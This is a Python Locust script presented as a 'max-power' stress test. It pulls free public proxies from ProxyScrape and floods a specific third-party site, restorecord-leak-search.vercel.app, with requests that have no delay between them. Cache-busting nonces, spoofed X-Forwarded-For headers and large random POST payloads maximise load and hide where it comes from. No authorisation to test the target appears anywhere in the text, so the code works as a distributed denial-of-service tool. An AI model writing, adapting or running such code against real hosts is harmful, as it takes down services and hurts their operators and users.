# locustfile_max_power.py
# Distributed Locust script with rotating proxies from ProxyScrape & proxy validation 🚀

from gevent import monkey
monkey.patch_all()

import gc, uuid, random, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from locust import HttpUser, TaskSet, task, events, constant

# Disable Python GC to avoid pauses under heavy load
gc.disable()

# Proxy list source
PROXY_SOURCE_URL = (
    "https://api.proxyscrape.com/v2/?request=getproxies"
    "&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
)
# How many proxies to validate
MAX_PROXIES_TO_CHECK = 100
# Timeout for validating each proxy
VALIDATION_TIMEOUT = 5

@events.test_start.add_listener
def fetch_and_validate_proxies(environment, **kwargs):
    print("[ProxySetup] Fetching proxy list...")
    try:
        resp = requests.get(PROXY_SOURCE_URL, timeout=15)
        resp.raise_for_status()
        raw_proxies = [p.strip() for p in resp.text.splitlines() if p.strip()]
        print(f"[ProxySetup] Retrieved {len(raw_proxies)} proxies, validating up to {MAX_PROXIES_TO_CHECK}...")
    except Exception as e:
        print(f"[ProxySetup] Failed to fetch proxies: {e}")
        environment.proxies = []
        return

    # Validate proxies concurrently
    valid = []
    test_url = "https://restorecord-leak-search.vercel.app"  # fast endpoint
    def validate(proxy):
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        try:
            r = requests.head(test_url, proxies=proxies, timeout=VALIDATION_TIMEOUT)
            if r.status_code < 400:
                return proxy
        except:
            return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(validate, p): p for p in raw_proxies[:MAX_PROXIES_TO_CHECK]}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                valid.append(result)
                print(f"[ProxySetup] Valid proxy: {result}")
    environment.proxies = valid
    print(f"[ProxySetup] Validation complete: {len(valid)} working proxies")

class UserBehavior(TaskSet):
    @task(7)
    def search(self):
        # pick a random proxy if available
        proxy = random.choice(self.environment.proxies) if self.environment.proxies else None
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

        query = random.choice([
            "123456789012345678",
            "987654321098765432",
            "user_example",
            "ip:192.168.0.1",
        ])
        headers = {
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Debug-Nonce": uuid.uuid4().hex,
            "X-Forwarded-For": proxy.split(":")[0] if proxy else None,
        }
        path = f"/?q={query}&nocache={uuid.uuid4().hex}"
        self.client.get(
            path,
            name="GET /?q",
            headers={k: v for k, v in headers.items() if v},
            proxies=proxy_dict
        )

    @task(3)
    def heavy_api(self):
        proxy = random.choice(self.environment.proxies) if self.environment.proxies else None
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        payload = {"data": "x" * random.randint(1000, 10000)}
        headers = {"X-Debug-Nonce": uuid.uuid4().hex}
        self.client.post(
            "/api/process",
            json=payload,
            headers=headers,
            proxies=proxy_dict,
            name="POST /api/process"
        )

class WebsiteUser(HttpUser):
    host = "https://restorecord-leak-search.vercel.app"
    tasks = [UserBehavior]
    wait_time = constant(0)

@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("[ChaosMonkey] MAX-POWER proxy stress test started...")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("[ChaosMonkey] MAX-POWER proxy stress test complete.")
